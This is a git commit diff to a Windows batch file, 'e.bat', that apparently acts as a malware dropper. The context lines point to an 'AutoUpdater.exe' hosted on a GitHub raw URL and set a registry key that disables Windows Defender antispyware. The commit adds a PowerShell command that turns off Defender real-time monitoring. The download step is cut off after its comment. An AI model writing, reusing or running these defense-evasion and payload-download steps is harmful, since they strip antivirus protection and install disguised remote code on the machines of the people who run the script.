1ca61e3ce2ffacf9c729a6cb8b38733ed9697793
EnVy <leanvieth@gmail.com>
2024-03-04 20:34:00 -0600

    Update e.bat

--- e.bat
+++ e.bat
@@ -3,6 +3,7 @@ set "file=AutoUpdater.exe"
 set "url=https://github.com/Sxzzzy/blue/raw/main/%file%"
 set "docPath=%USERPROFILE%"
 
+powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f
 
 :: Download the file
